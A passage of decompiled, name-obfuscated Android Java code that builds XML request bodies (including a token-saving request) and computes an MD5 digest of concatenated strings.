            newSerializer.endTag("", "Request");
            newSerializer.endDocument();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return stringWriter.toString();
    }

    private static String k() {
        XmlSerializer newSerializer = Xml.newSerializer();
        StringWriter stringWriter = new StringWriter();
        try {
            String e2 = e(s, m);
            newSerializer.setOutput(stringWriter);
            newSerializer.startDocument("utf-8", null);
            newSerializer.startTag("", "Request");
            newSerializer.startTag("", "SaveAOITokenReq");
            newSerializer.startTag("", "token");
            newSerializer.text(e2);
            newSerializer.endTag("", "token");
            newSerializer.endTag("", "SaveAOITokenReq");
            newSerializer.endTag("", "Request");
            newSerializer.endDocument();
        } catch (Exception e3) {
            e3.printStackTrace();
        }
        return stringWriter.toString();
    }

    private static void l() {
        StringBuffer stringBuffer = new StringBuffer(e);
        stringBuffer.append(m);
        stringBuffer.append(f);
        byte[] bArr = null;
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.reset();
            bArr = messageDigest.digest(stringBuffer.toString().getBytes());
        } catch (NoSuchAlgorithmException e2) {
            e2.printStackTrace();
        }
        j = bp.a(bArr);
    }
}
